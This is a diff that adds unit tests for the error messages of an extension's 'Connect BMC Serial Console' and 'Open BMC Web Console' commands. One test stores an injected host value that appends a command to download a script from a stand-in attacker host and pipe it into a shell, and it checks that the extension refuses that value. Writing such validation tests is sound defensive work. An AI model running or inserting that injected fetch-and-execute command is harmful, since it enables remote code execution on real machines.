@@ -173,6 +173,43 @@ describe("nexus.server.connectBmcSol", () => {
     expect(String(showErrorMessage.mock.calls[0][0])).toContain("IPMI Auth Profile");
   });
 
+  it("C1 — the missing-host refusal names the COMMAND, not 'this macro', and says nothing was run", async () => {
+    showErrorMessage.mockResolvedValue(undefined);
+
+    await connectBmcSol(context({}), { server: server({ ipmiHost: undefined }) });
+
+    const msg = String(showErrorMessage.mock.calls[0][0]);
+    // A menu click has no macro — the pre-fix copy said "…but this macro uses
+    // ${profile.ipmiHost}", which is nonsense here.
+    expect(msg).not.toContain("this macro");
+    expect(msg).not.toContain("${profile.ipmiHost}");
+    expect(msg).toContain("Connect BMC Serial Console needs it");
+    expect(msg).toContain("Nothing was run.");
+  });
+
+  it("C1 — the ipmiUsername-missing refusal is also command-subject phrased", async () => {
+    showErrorMessage.mockResolvedValue(undefined);
+
+    // No linked profile → ${profile.ipmiUsername} cannot resolve.
+    await connectBmcSol(context(VAULTED, []), { server: server({ ipmiAuthProfileId: undefined }) });
+
+    const msg = String(showErrorMessage.mock.calls[0][0]);
+    expect(msg).not.toContain("this macro");
+    expect(msg).toContain("Connect BMC Serial Console needs it");
+    expect(msg).toContain("Nothing was run.");
+  });
+
+  it("C1 — the charset-invalid refusal ends with the command's outcome, not 'sent'", async () => {
+    showErrorMessage.mockResolvedValue(undefined);
+
+    await connectBmcSol(context(VAULTED), { server: server({ ipmiHost: "10.0.0.9; curl evil.sh|sh" }) });
+
+    const msg = String(showErrorMessage.mock.calls[0][0]);
+    expect(msg).toContain("can't be placed in a command or URL");
+    expect(msg).toContain("Nothing was run.");
+    expect(msg).not.toContain("Nothing was sent.");
+  });
+
   it("refuses a hostile stored ipmiHost — the chokepoint applies here exactly as in a macro run", async () => {
     showErrorMessage.mockResolvedValue(undefined);
 
@@ -254,6 +291,35 @@ describe("nexus.server.openBmcWebConsole", () => {
 
     expect(openExternal).not.toHaveBeenCalled();
     expect(String(showErrorMessage.mock.calls[0][0])).toContain("IPMI / BMC Host");
+  });
+
+  it("C1 — the missing-host refusal names Open BMC Web Console and says nothing was opened", async () => {
+    showErrorMessage.mockResolvedValue(undefined);
+
+    await openBmcWebConsole(context(), { server: server({ ipmiHost: undefined }) });
+
+    const msg = String(showErrorMessage.mock.calls[0][0]);
+    expect(msg).not.toContain("this macro");
+    expect(msg).toContain("Open BMC Web Console needs it");
+    expect(msg).toContain("Nothing was opened.");
+  });
+
+  it("C5 — a resolved-but-unusable web address carries the Edit Server (Advanced) button", async () => {
+    showErrorMessage.mockResolvedValue("Edit Server");
+    // Charset-valid (digits, dots, one colon) but the URL parser rejects the
+    // out-of-range port, so it resolves and then fails the http(s) whitelist —
+    // the branch that used to be a plain error with no action.
+    const target = server({ ipmiHost: "10.0.0.9:99999" });
+
+    await openBmcWebConsole(context(), { server: target });
+
+    expect(openExternal).not.toHaveBeenCalled();
+    const msg = String(showErrorMessage.mock.calls[0][0]);
+    expect(msg).toContain("does not form a usable web address");
+    // The button and its Advanced-expanded route — the docs promise every
+    // missing-piece error carries it.
+    expect(showErrorMessage.mock.calls[0].slice(1)).toContain("Edit Server");
+    expect(executeCommand).toHaveBeenCalledWith("nexus.server.edit", { server: target, expandAdvanced: true });
   });
 
   it("needs no IPMI auth profile at all — the browser does its own login", async () => {
